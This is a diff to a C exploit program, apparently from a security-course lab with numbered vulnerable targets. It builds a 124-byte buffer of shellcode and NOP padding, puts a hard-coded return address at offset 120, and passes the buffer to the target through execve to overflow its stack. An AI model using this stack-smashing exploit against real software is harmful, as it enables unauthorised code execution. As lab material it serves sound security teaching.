@@ -4,6 +4,9 @@
 #include <unistd.h>
 #include "shellcode-64.h"
 
+#include <stdint.h>
+#include <byteswap.h>
+
 #define TARGET "../targets/target1"
 
 int
@@ -48,36 +51,24 @@ main ( int argc, char * argv[] )
 
 	*/
 
+	// Initialize explit string
 	char exploit[124];
-	memset(exploit, '\x00', 124);
-
-
-	int i;
-
-	// filling up first 48 bytes of exploit string with NOP instructions
-	for (i = 0; i < 48; i++){
-		exploit[i] = '\x90';
-	}
+	bzero(exploit, 124);
 
 	strcat(exploit, shellcode); // append the shellcode to exploit string
-	strcat(exploit, "\x90\x90\x90"); // pad the shellcode to make it word-aligned
 
-	// fill up remaining bytes till 120 with NOP instructions
-	for(i = 96; i < 120; i++){
-		exploit[i] = '\x90';
-	}
+	// fill up the space after the shellcode up to the 120th position with NOP
+	int pos = strlen(exploit);	
+	memset(&exploit[pos], NOP, 120 - pos);
 
 	// overwrite return address with buf start address
-	exploit[120] = '\x10';
-	exploit[121] = '\xfe';
-	exploit[122] = '\x21';
-	exploit[123] = '\x20';
+	char* retaddr = (char*)0x2021fe10;
+  	SET_VALUE(exploit, 120, retaddr);
 
 
 	args[1] = exploit;
 
 	args[2] = NULL;
-
 	env[0] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
